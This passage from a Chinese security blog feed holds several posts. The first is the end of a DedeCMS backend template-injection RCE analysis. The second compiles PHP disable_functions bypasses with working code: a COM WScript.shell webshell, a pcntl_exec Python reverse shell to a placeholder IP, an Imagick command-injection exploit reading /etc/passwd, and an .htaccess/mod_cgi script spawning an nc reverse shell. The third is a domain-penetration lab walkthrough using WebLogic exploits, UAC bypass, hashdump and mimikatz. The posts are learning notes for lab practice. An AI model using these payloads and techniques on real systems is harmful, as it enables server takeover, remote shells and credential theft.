<p>先知上给的EXP是<br>
<a href="http://localhost/%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80/tag_test_action.php?url=a&amp;token=&amp;partcode=%7Bdede:field">url=a&amp;token=&amp;partcode={dede:field</a> name='source' runphp='yes'}phpinfo();{/dede:field}，<br>
但是跟下来没发现用到url参数，其实不用也可以。</p>
<p>跟图中标记的一样，<code>token=</code>，其中partcode要符合dedecms的模板风格，即{dede:file}{/dede:field}，为了走入Runphp分支，要添加runphp='yes'；所以分析完毕后，参数就比作者简单一点<br>
<code>?token=&amp;partcode{dede:filed runphp='yes'}system(whoami);{/dede:field}</code> 即可</p>
<p>结果如下</p>
<figure data-type="image" tabindex="14"><img src="https://chriskalix.github.io/post-images/1597391454531.png" alt="" loading="lazy"></figure>
<h1 id="后续思考">后续思考</h1>
<p>没挖过dedecms的漏洞，但是针对这种类型的cms，猜测挖掘者的手法可能为2种。</p>
<ol>
<li>从危险函数eval作为触发点进行回溯。其实在很多的cms中也会有这种问题，就是用在模板渲染中使用eval执行代码，在我审计过的为数不多的cms中，大概有3个都是这种类型触发的。</li>
<li>从功能出发，这个其实就是后台的模板功能，跟上面所述，模板渲染等功能是高发区（RCE高发区）。不过前台用户一般没有权限更改，只有后台用户可以，所以一般情况下，都是后台RCE居多</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[disable_functions bypass整理]]></title>
        <id>https://chriskalix.github.io/post/GqcqeDkXU/</id>
        <link href="https://chriskalix.github.io/post/GqcqeDkXU/">
        </link>
        <updated>2020-07-26T10:22:04.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>disable_function，通常在上传了webshell后让人头疼的问题。之前做过绕过，不过没有系统的整理复现过。话题比较老了，做个回顾纪念，大部分为搬运</p>
</blockquote>
<h2 id="环境">环境</h2>
<p>phpstudy<br>
php 7.1.9</p>
<p>开始前需要手动添加<code>disable_functions</code>，我配置的为 <code>exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</code></p>
<h2 id="绕过整理">绕过整理</h2>
<h3 id="0x01-windows-系统组件">0x01 Windows - 系统组件</h3>
<blockquote>
<p>适用于Windows下，使用前需要查看COM组件是否开启。windows下5.X默认支持</p>
</blockquote>
<p>在 <code>php.ini</code> 中找到 <code>extension=php_com_dotnet.dll</code> 并且开启（若没有则直接添加），结果如下<br>
<img src="https://chriskalix.github.io/post-images/1595758966523.png" alt="" loading="lazy"></p>
<p>对于com组件仅简单了解，不做搬运文章的苦力，<a href="https://www.zhihu.com/question/49433640">文章地址</a>。从百度百科抄一句：COM是开发软件组件的一种方法。组件实际上是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。<br>
通过COM组件，调用WScript.shell（这个在写VBS的时候经常用到）或者shell.application执行系统命令。从安全客上搬运的代码如下：</p>
<pre><code class="language-php">&lt;?php
$wsh = isset($_GET['wsh']) ? $_GET['wsh'] : 'wscript';
if($wsh == 'wscript') {
    $command = $_GET['cmd'];
    $wshit = new COM('WScript.shell') or die(&quot;Create Wscript.Shell Failed!&quot;);
    $exec = $wshit-&gt;exec(&quot;cmd /c&quot;.$command);
    $stdout = $exec-&gt;StdOut();
    $stroutput = $stdout-&gt;ReadAll();
    echo $stroutput;
}
elseif($wsh == 'application') {
    $command = $_GET['cmd'];
    $wshit = new COM(&quot;Shell.Application&quot;) or die(&quot;Shell.Application Failed!&quot;);
    $exec = $wshit-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c &quot;.$command);
} 
else {
  echo(0);
}
?&gt;
</code></pre>
<p>执行效果如下</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1595758973366.png" alt="" loading="lazy"></figure>
<h3 id="0x02-linux-ld_preload">0x02 Linux - LD_PRELOAD</h3>
<blockquote>
<p>条件：1. 能上传.so文件 2. putenv能使用，控制环境变量 3. mail, imap_mail, mb_send_mail, error_log等函数能够调用</p>
</blockquote>
<p>相比起来，这个稍微熟悉一点。之前在写Linux下应急响应脚本的时候，就包含LD_PRELOAD的检验。LD_PRELOAD是linux下的预加载环境变量，可以通过导入恶意的.so文件替换环境变量，从而劫持函数。在安全客上有一篇<a href="https://www.anquanke.com/post/id/175403">深入浅出LD_PRELOAD&amp;putenv()</a>。为什么要使用mail之类的函数？因为在设置环境变量后，仅会在请求期间存在，想要使预环境变量被加载，就要找到创建子进程的函数，从而触发恶意.so文件。同样的摸到了仓库<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">github - LD_PRELOAD</a>，讲的也很好，在理解的情况下做一点搬运<br>
通常情况下，大部分文章使用LD_PRELOAD的方法为如下几步：</p>
<ol>
<li>编写一个getuid的C函数（为什么是getuid，因为sendmail会用到），编译成xx.so</li>
<li>运行phpenv，设置LD_PRELOAD为xx.so</li>
<li>运行mail函数，由于设置了LD_PRELOAD，会优先从xx.so中寻找函数</li>
<li>执行恶意命令</li>
</ol>
<p>但是在实战用会碰到一系列问题，如禁止sendmail，服务器上根本没有安装sendmail。仓库中提到，不要局限于劫持某一个函数，而应考虑<strong>拦截启动进程</strong>。在GCC中有一个C语言的拓展修饰符， <code>__attribute__((constructor))</code> ，可以让由它修饰的函数在<code>main()</code> 函数之前运行。当出现在共享对象中，一旦对象被系统加载，则立即执行由它所修饰的函数。而当启动新进程的时候，又会自动调用该函数，会造成循环阻塞。这里需要注意的是，由于需要调用 <code>unsetenv()</code> ，在centos下是不可行的（具体原因看仓库）。<br>
在知道原理后直接使用作者的仓库进行尝试：<br>
<img src="https://chriskalix.github.io/post-images/1595758980470.png" alt="" loading="lazy"></p>
<p>这里作者提到一个问题，如果目标开启SELinux会导致对outpath没有读写权限，以及.so文件是在debian系统下编译，对于非debian系统需要重新编译。</p>
<h3 id="0x03-linux-pcntl_exec">0x03 Linux - pcntl_exec</h3>
<blockquote>
<p>这个也很早了，文章很多，主要是做个记录</p>
</blockquote>
<p>该函数在PHP&gt;4.2.0，5，7中存在。搬运一个python的版本，可以自行修改</p>
<pre><code class="language-php">&lt;?php
pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
</code></pre>
<h3 id="0x04-imagick">0x04 imagick</h3>
<blockquote>
<p>这个每个文章里基本都有，做个记录吧</p>
</blockquote>
<p>还是一样，先在 <code>phpinfo</code> 中先看下是否有该组件。这个在看H1文章会看到，属于组件问题。直接搬运一下RicterZ师傅的代码，url自行更改（不过感觉现在基本没了吧...）</p>
<pre><code class="language-php"># Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
# Test on: Ubuntu 12.04
 
# Exploit:
 
&lt;?php
# PHP Imagick disable_functions Bypass
# Author: Ricter &lt;ricter@chaitin.com&gt;
#
# $ curl &quot;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&quot;
# &lt;pre&gt;
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# &lt;/pre&gt;
echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo &quot;Run command: $command\n====================\n&quot;;
 
$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');
 
$exploit = &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)'
pop graphic-context
EOF;
 
file_put_contents(&quot;$imagick_file&quot;, $exploit);
$thumb = new Imagick();
$thumb-&gt;readImage(&quot;$imagick_file&quot;);
$thumb-&gt;writeImage(tempnam('/tmp', 'img'));
$thumb-&gt;clear();
$thumb-&gt;destroy();
 
echo file_get_contents($data_file);
?&gt;
</code></pre>
<h3 id="0x05-htaccess">0x05 .htaccess</h3>
<blockquote>
<p>.htaccess，做配置的时候老见到了，也有用来做后门隐藏的，总之用法很多</p>
</blockquote>
<p>（搬运一下）有如下条件：</p>
<ol>
<li>必须是apache</li>
<li>mod_cgi</li>
<li>运行.htaccess生效</li>
<li>有写.htaccess的权限</li>
</ol>
<pre><code class="language-php">&lt;?php
$cmd = &quot;nc -c'/bin/bash' 127.0.0.1 4444&quot;; //反弹一个shell出来，这里用本地的4444端口
$shellfile =&quot;#!/bin/bash\n&quot;; //指定shell
$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //需要指定这个header，否则会返回500
$shellfile .=&quot;$cmd&quot;; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;
}
if(!isset($_GET['checked']))
{
    @file_put_contents('.htaccess',&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); 
    header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
}
else
{
    $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
    $writable = is_writable('.'); //检测当前目录是否可写
    $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
        checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);
        checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);
    if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))
    {
        echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //必须满足所有条件
    }
    else
    {
       
 checkEnabled(&quot;Backing 
up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in 
.htaccess.bak&quot;,&quot;Failed!&quot;); //备份一下原有.htaccess
        
checkEnabled(&quot;Write 
.htaccessfile&quot;,file_put_contents('.htaccess',&quot;Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle，我们的特定扩展名
        checkEnabled(&quot;Write shellfile&quot;,file_put_contents('shell.dizzle',$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//写入文件
        checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//给权限
        echo &quot;Executing the script now.Check your listener &lt;img src = 'shell.dizzle' style ='display:none;'&gt;&quot;; //调用
    }
}
?&gt;
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/5320#toc-0">先知文章</a><br>
<a href="https://baijiahao.baidu.com/s?id=1659386031704746677&amp;wfr=spider&amp;for=pc">E安全</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透整理复现]]></title>
        <id>https://chriskalix.github.io/post/2cLB43Y5A/</id>
        <link href="https://chriskalix.github.io/post/2cLB43Y5A/">
        </link>
        <updated>2020-07-19T13:19:54.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>不知道为什么用这个传不了PDF，就放一个Github链接吧~</p>
</blockquote>
<p><a href="https://github.com/chriskaliX/AD_pentest_Notes">Github项目地址</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透靶机实战(一)]]></title>
        <id>https://chriskalix.github.io/post/-iDU1AvVp/</id>
        <link href="https://chriskalix.github.io/post/-iDU1AvVp/">
        </link>
        <updated>2020-07-01T02:27:34.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>标题是（一），其实是红日的靶机2，前段时间学习了域的基础后最近开始做靶机，逐步提升吧，希望有不足的地方大家能帮我指出，谢谢</p>
</blockquote>
<h2 id="0x01-环境配置">0x01 环境配置</h2>
<h3 id="1-环境搭建">1. 环境搭建</h3>
<p>从<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">这里</a>下载靶机环境，配置两个hostonly网卡分别为10.10.10.0/24，以及192.168.111.1/24网段</p>
<h3 id="2-环境一览">2. 环境一览</h3>
<table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">内网地址</th>
<th style="text-align:center">外网地址</th>
<th style="text-align:center">系统</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">DC</td>
<td style="text-align:center">10.10.10.10.</td>
<td style="text-align:center"></td>
<td style="text-align:center">Windows 2012(64位)</td>
</tr>
<tr>
<td style="text-align:center">WEB</td>
<td style="text-align:center">10.10.10.80</td>
<td style="text-align:center">192.168.111.80</td>
<td style="text-align:center">Windows 2008(64位)</td>
</tr>
<tr>
<td style="text-align:center">PC</td>
<td style="text-align:center">10.10.10.201</td>
<td style="text-align:center">192.168.111.201</td>
<td style="text-align:center">Windows 7(32位)</td>
</tr>
<tr>
<td style="text-align:center">Kali(自建)</td>
<td style="text-align:center"></td>
<td style="text-align:center">192.168.111.x</td>
<td style="text-align:center">Kali Linux 2020.2</td>
</tr>
</tbody>
</table>
<p>[*] 注：在主机 <code>WEB</code> 起来后，要手动起 <code>Weblogic</code> 服务</p>
<h2 id="0x02-实战开始">0x02 实战开始</h2>
<blockquote>
<p>在做的时候要当成黑盒，这样做起来比较有逻辑</p>
</blockquote>
<h3 id="1-外部突破">1. 外部突破</h3>
<h4 id="常规扫描">常规扫描</h4>
<p><code>nmap 192.168.111.1/24 -sS -p 1-65535 -T4</code> 对C段下进行初步发现，扫描结果如下：</p>
<pre><code>Nmap scan report for 192.168.111.80
Host is up (0.0014s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3389/tcp  open  ms-wbt-server
7001/tcp  open  afs3-callback
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49183/tcp open  unknown
49190/tcp open  unknown
60966/tcp open  unknown
MAC Address: 00:0C:29:91:56:77 (VMware)

Nmap scan report for 192.168.111.201
Host is up (0.0080s latency).
Not shown: 65526 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 00:0C:29:32:32:CD (VMware)
</code></pre>
<p>其中80机器对外开放80端口，觉得比较有可能为入口点。使用dirsearch扫描目录，无果。其余开放的1433，3389，445等常规端口，可以尝试口令、或者CVE直接打一下试试。<br>
这时访问7001端口，发现为web应用。想起了熟悉的weblogic，于是用dirsearch再遍历一下，发现/console目录，访问。<br>
<img src="https://chriskalix.github.io/post-images/1594016543093.png" alt="" loading="lazy"><br>
果然是weblogic，版本为10.3.6.0</p>
<h4 id="权限获取">权限获取</h4>
<p>这里用 <code>rabbitmask</code> 师傅的 <code>weblogicscan</code> 扫一发。存在<code>cve-2019-2725</code>以及<code>cve-2019-2727</code>。我就直接用 <code>msf</code> 上的cve-2019-2725试了一下，得到了初步权限<br>
这里还是比较简单的<br>
<img src="https://chriskalix.github.io/post-images/1594016548948.png" alt="" loading="lazy"></p>
<h3 id="2-本机信息获取">2. 本机信息获取</h3>
<blockquote>
<p>亮神：渗透测试的本质就是信息收集</p>
</blockquote>
<p><code>shell</code>进入靶机，输入 <code>chcp 65001</code> 修改乱码显示。整理后信息如下，其实信息获取还不够完善，例如防火墙策略等等，可以参考腾讯蓝军的文章：</p>
<table>
<thead>
<tr>
<th style="text-align:center">信息</th>
<th style="text-align:center">详情</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">主机名</td>
<td style="text-align:center">WEB</td>
</tr>
<tr>
<td style="text-align:center">主机版本</td>
<td style="text-align:center">Windows Server 2008 R2</td>
</tr>
<tr>
<td style="text-align:center">域名称</td>
<td style="text-align:center">de1ay.com</td>
</tr>
<tr>
<td style="text-align:center">内网IP</td>
<td style="text-align:center">10.10.10.80</td>
</tr>
<tr>
<td style="text-align:center">防护软件</td>
<td style="text-align:center">360</td>
</tr>
<tr>
<td style="text-align:center">权限</td>
<td style="text-align:center">Administrator</td>
</tr>
</tbody>
</table>
<p>执行<code>net time /domain</code> 报错5，代表有域，但是当前不是域用户</p>
<h4 id="端口开放">端口开放</h4>
<pre><code>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       736
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1472
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2228
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       400
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       784
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49183          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49190          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:60966          0.0.0.0:0              LISTENING       1472
  TCP    10.10.10.80:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.80:7001       0.0.0.0:0              LISTENING       3264
  TCP    127.0.0.1:7001         0.0.0.0:0              LISTENING       3264
  TCP    192.168.111.80:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.111.80:7001    0.0.0.0:0              LISTENING       3264
  TCP    192.168.111.80:49399   192.168.111.128:4444   ESTABLISHED     1088
</code></pre>
<h4 id="进程信息">进程信息</h4>
<p><img src="https://chriskalix.github.io/post-images/1594016561684.png" alt="" loading="lazy"><br>
主机上运行着360</p>
<h3 id="3-权限提升">3. 权限提升</h3>
<blockquote>
<p>这里看的也少，有基础的知识点没有覆盖，于是摘抄一些作为记录</p>
</blockquote>
<h4 id="windows提权方法">windows提权方法</h4>
<p>这里有Wing仔在先知上的翻译<a href="https://xz.aliyun.com/t/2519">文章</a>，很详细，我就不搬运了。自己目前知道的比较狭窄，如下：</p>
<ul>
<li>本地提权漏洞，如ms15_051</li>
<li><strong>Bypassuac</strong>（对windows 7、8以上getsystem均需要bypass）</li>
<li>令牌窃取</li>
<li>HASH（有密码当然可以...）</li>
</ul>
<h4 id="补丁获取">补丁获取</h4>
<p>上主机，运行 <code>systeminfo</code> ，补丁如下：</p>
<pre><code class="language-txt">[01]: KB2999226
[02]: KB958488
[03]: KB976902
</code></pre>
<p>一般情况下...会是比较多的补丁吧，这时候可以到<a href="https://bugs.hacking8.com/tiquan/">提权辅助网页</a>进行搜索（类似于在线的exploit_suggester :） ）</p>
<h4 id="漏洞尝试">漏洞尝试</h4>
<p>补丁很少，感觉随便抓一个就能打，于是先用<code>post/multi/recon/local_exploit_suggester</code> 看一看，结果如下：<br>
<img src="https://chriskalix.github.io/post-images/1594016571241.png" alt="" loading="lazy"><br>
用 <code>ms15_051</code> 进行尝试<br>
<img src="https://chriskalix.github.io/post-images/1594016576216.png" alt="" loading="lazy"><br>
...竟然失败了，误以为payload设置错误，来回尝试均无果。这时候怀疑可能是360拦截，这时候看到了别WP，说可能是 UAC 的问题(虽然我不知道怎么看的，因为我好像没有弹框...)。<br>
UAC的知识点没有看过，这次靶机遇到了，稍微补习一下（毕竟是笔记嘛~熟悉的朋友们可以跳过这个部分）</p>
<h5 id="额外补充-uac">额外补充-UAC</h5>
<h6 id="uac简介">UAC简介</h6>
<p>UAC(User Account Control)即用户账户控制，是在Windows Vista以及更高版本上采用的一种控制机制。其原理是通过通知用户是否对应用程序使用硬盘驱动器和系统文件授权(平时熟悉的弹框)，以达到帮助阻止恶意程序损坏系统的效果 -- 摘抄</p>
<h6 id="bypassuac">bypassuac</h6>
<p>从这篇<a href="https://www.cnblogs.com/Chesky/p/UAC_Bypass.html">文章</a>里摘抄出了 bypassuac 的常见方法，其实在小y师傅的<a href="https://github.com/xiaoy-sec/Pentest_Note">Pentest_Note</a>里也记录了许多</p>
<ul>
<li>白名单提权机制</li>
<li>DLL劫持</li>
<li>Windows自身提权漏洞</li>
<li>远程注入</li>
<li>COM接口技术</li>
</ul>
<h6 id="msf">MSF</h6>
<blockquote>
<p>从内网安全攻防摘抄了部分</p>
</blockquote>
<p>运行 <code>exploit/windows/local/bypassuac</code> ，获得了新的 <code>session</code> ，在新的 <code>session</code> 中getsystem获取权限。</p>
<p>[*] 注1：bypassuac模块会产生多个文件，容易被杀软识别。使用 bypassuac_injection 模块直接运行在内存的反射DLL中，不会接触到目标机器硬盘，降低了被检测出的概率<br>
[*] 注2：bypassuac的前提为，当前用户必须在管理员组中（该靶机在管理员组），且UAC为默认配置（仅在程序试图修改我的计算机时通知我）</p>
<h4 id="权限获取-2">权限获取</h4>
<p>其实在刚刚的 <code>local_exploit_sugguester</code> 中就展示了一个方法 <code>bypassuac_eventvwr</code> ，其实用 <code>bypassuac</code> 也能成功，截图如下<br>
<img src="https://chriskalix.github.io/post-images/1594016584867.png" alt="" loading="lazy"></p>
<h4 id="进程迁移">进程迁移</h4>
<blockquote>
<p>将进程迁移至稳定的SYSTEM进程中</p>
</blockquote>
<p>刚开始不懂，看着教程直接迁移到了explorer.exe，没有认真看权限，结果降权了...这时候内心有个问题，进程迁移是可以迁移到任意进程嘛？ZhuDongFangYu.exe也可以作为目标嘛？<br>
这边为了好玩，迁移到了主动防御...群里师傅推荐的是 <code>svchost.exe</code> 和 <code>csrss.exe</code> ，我查了一下大概是做啥的，记录了记录了...</p>
<h3 id="4-凭证获取">4. 凭证获取</h3>
<blockquote>
<p>这里直接使用msf来做，其余的方式在博客的前面几章里有留作介绍</p>
</blockquote>
<h4 id="hashdump">hashdump</h4>
<p>msf中有两种获取hash的方式，分别为<code>hashdump</code>和<code>smart_hashdump</code>。两者的区别为 hashdump仅能导出本地的hash，而smart_hashdump可以导出域用户的hash。但是目前的账户为本机<code>SYSTEM</code> 权限，并不是域用户，所以跑出的没有差别(我认为)<br>
<img src="https://chriskalix.github.io/post-images/1594016593384.png" alt="" loading="lazy"><br>
[*] 注：这里有一个小问题，作者的靶机其实密码都是一样的，而我在登录 WEB这台机器的时候密码不对，猜解后我重置了密码，导致和其他账户都不一样</p>
<h4 id="明文获取">明文获取</h4>
<p>加载mimikatz，用wdigest抓取明文，但是读取不到...<br>
<img src="https://chriskalix.github.io/post-images/1594016599218.png" alt="" loading="lazy"><br>
这时候纳闷了，为什么和别人说的不一样...把错误的信息复制出来，用bing去搜，发现可能是进程位数问题 - <a href="https://security.stackexchange.com/questions/137002/error-when-using-metasploit-mimikatz-module">文章</a><br>
好吧...我就不应该尝试迁移到x86进程里的，这时候重新迁移一下，到<code>csrss.exe</code> 上，重新获取<br>
由于<code>WEB\de1ay</code>的密码被我修改过，且后续不会使用到，所以这里截取部分（在<a href="https://www.anquanke.com/post/id/193193">文章</a>中，直接在本机抓到了域管账号密码...我没有啊...不过没关系）<br>
<img src="https://chriskalix.github.io/post-images/1594016604606.png" alt="" loading="lazy"></p>
<h3 id="5-令牌利用失败">5. 令牌利用（失败）</h3>
<blockquote>
<p>当然可以尝试扫描内网，然后打CVE，SMB爆破等等...其实均可成功的~，但是作者的靶机上写到了Access Token的利用，我们还是试一试吧~（毕竟目标不是快速通关）</p>
</blockquote>
<p>在msf下 <code>load incognito</code> ，<code>list_tokens -u</code> 查看一下，如下：</p>
<p><img src="https://chriskalix.github.io/post-images/1594016720508.png" alt="" loading="lazy"><br>
这里其实有个小插曲，我看了<code>steal_token</code>这个操作，就去尝试了一下，结果这个meterpreter就好像变&quot;坏&quot;了（无法执行任何操作，均deny）...埋个坑，后续看看<br>
通过模拟令牌，切换到 <code>DE1AY\mssql</code> 用户下<br>
<img src="https://chriskalix.github.io/post-images/1594016727153.png" alt="" loading="lazy"><br>
但这个时候在meterpreter里什么操作都不行了（变坏了）...可是作者的文章里明明提到了 <code>Access Token利用（MSSQL利用）</code> ...为什么会不行呢...希望指教哇...<br>
本来我的思路是从这里切换到mssql权限，然后 <code>ms14-068</code> ，结果只能换个方法了~~</p>
<p><strong>[*]</strong> 遗留问题：这里是为什么（这样是不是不对啊..）....</p>
<h3 id="6-内网探测">6. 内网探测</h3>
<blockquote>
<p>关于信息获取的姿势有很多，腾讯前几天的<a href="https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA">文章</a>写的非常全，当然里面包括的不止是信息收集这一部分，可以当作备忘录实时翻看了</p>
</blockquote>
<h4 id="spn获取">SPN获取</h4>
<p>指令 <code>setspn -T de1ay.com -Q */*</code> ，快速获取域内注册的服务，如下：</p>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1594016733477.png" alt="" loading="lazy"></figure>
<p>看到域内有DC,PC,WEB三台主机。很明显DC就是域控啦（当然，应该用别的方式加以识别，例如<code>net time /domain</code>等等...），有了域名就能快速发现域内机器的IP，也不用挂上代理慢慢扫描了...</p>
<h4 id="主机端口探测">主机端口探测</h4>
<p>刚才已经发现了所在的内网网段，在msf里添加上网段。<br>
<code>run autoroute -s 10.10.10.0/24</code> ，这边可以挂上socks，然后用proxychains + nmap，或者传工具(nbtscan)等等都可以。<br>
由于已经知道域内主机的地址（SPN扫描发现），直接用 <code>auxiliary/scanner/portscan/tcp</code> 扫一下两台主机，结果如下<br>
<img src="https://chriskalix.github.io/post-images/1594016738827.png" alt="" loading="lazy"></p>
<h3 id="7-漏洞尝试">7. 漏洞尝试</h3>
<blockquote>
<p>看到了445和3389异常兴奋...于是想照着域控先来一发</p>
</blockquote>
<h4 id="永恒之蓝">永恒之蓝</h4>
<p>看到 <code>SMB</code> 第一时间想到的就是永恒之蓝，10.10.10.10 是 <code>DC</code> ，当然想法是一把梭。但是msf的模块在windows 2008以上会有问题，模块无法正常load进来，这个可以在 metasploit github上的<a href="https://github.com/rapid7/metasploit-framework/issues/13478">issue</a>里找到。<br>
这时候打 <code>10.10.10.201</code> 那台 <code>PC</code> 也无法成功，情况未知...很是头疼。在星球里问了，换上了 <code>doublepulsar</code> ，仍然无果<br>
这难道就没有办法了嘛~其实github上有NSA泄露的原版，可以拖上去继续尝试...为了快捷，我先尝试别的...</p>
<h4 id="cve-2019-0708">CVE-2019-0708</h4>
<p>先用校验模块尝试看一看<br>
<img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2%5C14.png" alt="" loading="lazy"></p>
<p>域控没有3389的问题，PC有问题。那么上手去打一下，这边注意因为是用的vmware起的环境，所以target要重新设定为当前vmware的版本（默认的Automatic不行），这里又头疼了...因为我的VM是15.5.6的，target里没有......</p>
<p>做到这里有点郁闷了...因为MS17017没有成功（其实可以的，只是msf上的模块有问题），难道只有用 psexec 了嘛.</p>
<h3 id="8-横向移动">8. 横向移动</h3>
<p>这边其实垮掉了。上去一看环境崩坏，捣鼓半天很是痛苦，果然做靶机最最痛苦的就是环境问题。下面拉跨的给出正解文章</p>
<ul>
<li><a href="http://www.adminxe.com/888.html">文章1</a></li>
<li><a href="https://www.anquanke.com/post/id/193193">文章2</a></li>
</ul>
<p>因为域的问题（不太清楚是因为修改了密码还是中间的误操作），导致本机上应该能抓到域管账号密码却没有了~花费了很多时间看环境的问题，还是比较痛苦的...下一步决定去看xq17表哥的文章，搭建域环境摸一遍，附上一个第一次做成功的图吧...累了累了...</p>
<p><img src="C:%5CUsers%5Cchris%5CDesktop%5CBlog%5Cimgs%5Cclass2_11.png" alt="" loading="lazy"><br>
毕竟还是比较真实的嘛~~~</p>
<h2 id="0x03-知识点坑点总结">0x03 知识点&amp;坑点总结</h2>
<h3 id="1-知识点">1. 知识点</h3>
<ul>
<li>UAC（bypass）</li>
<li>Access Token</li>
<li>SPN</li>
<li>GPP</li>
<li>psexec | wmi</li>
<li>hashdump (Wdigest)</li>
</ul>
<h3 id="2-坑点">2. 坑点</h3>
<ul>
<li>mimikatz抓不到</li>
<li>进程迁移位数</li>
<li>ms17017</li>
<li>环境问题，十分痛苦</li>
</ul>
<h2 id="0x04-后续思考">0x04 后续思考</h2>
<ol>
<li>日志清理</li>
<li>动作太大</li>
<li>票据存留</li>
</ol>
<p>做完之后原理性的东西需要再加以总结，另外有些虎头蛇尾，还是继续看一看域环境，加深印象</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透基础知识(三)-思维导图补充]]></title>
        <id>https://chriskalix.github.io/post/3dogm6EPG/</id>
        <link href="https://chriskalix.github.io/post/3dogm6EPG/">
        </link>
        <updated>2020-06-27T07:24:14.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>这段时间看内网基础的时候，看到一个比较好的脑图，忘记从哪里抄来的了...不过作者写的很好，我就跟着梳理一下</p>
</blockquote>
<h2 id="思维导图">思维导图</h2>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593399265693.png" alt="" loading="lazy"></figure>
